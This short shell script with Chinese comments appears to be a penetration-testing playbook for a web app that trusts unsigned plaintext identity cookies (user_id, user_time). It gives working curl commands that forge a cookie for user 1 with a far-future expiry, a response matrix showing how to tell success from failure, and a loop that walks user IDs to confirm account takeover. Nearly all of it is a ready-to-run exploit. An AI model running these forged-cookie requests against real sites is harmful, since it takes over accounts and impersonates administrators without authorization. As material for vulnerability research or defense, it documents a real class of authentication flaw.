# 判定：明文身份 Cookie 一把梭
# 站点把登录态放在两个客户端 Cookie：user_id=<用户主键> ; user_time=<到期时间戳>
# 中间件只判 user_time>now 且 user_id 非空，随后按主键直接加载用户（无签名/无服务端会话绑定）

# 1) 先找一个「写了身份 Cookie」的响应：登录接口成功分支 / 退出接口 / 任何 302 回跳
curl -sk -D - -o /dev/null 'http://TARGET/home/api.login/login3' \
  --data 'code=CAPTCHA&mobile_code=CODE&login_type=888'
# 关注 Set-Cookie: user_id=...; user_time=...

# 2) 伪造（user_time 填未来时间戳即可永久有效）
curl -sk -D - -H 'Cookie: user_id=1; user_time=9999999999' \
  'http://TARGET/home/index/index'

# 3) 对照矩阵（确认两个 Cookie 各自作用，避免把「登录页 200」当成成功）
#    user_id 单发          -> 302 login
#    user_time=0 / =1     -> 302 login
#    user_time=future     -> 200 后台
#    user_id=2,3,...      -> 200 切换身份 / 500 用户不存在（=主键遍历 oracle）

# 4) 批量确认身份是否随主键变化（只读、低速率）
for i in 1 2 3 5 10; do
  echo "== uid=$i"
  curl -sk -H "Cookie: user_id=$i; user_time=9999999999" \
       'http://TARGET/home/index/index' | grep -oP '(?<=<title>)[^<]+|[\u4e00-\u9fa5]{2,20}管理员[^<]{0,10}' | head -3
  sleep 2
done

# 判据：200 + 页面出现真实用户名/菜单 = 账号接管成立；500 System Error = 该主键无对应用户（仍证明主键直连查询）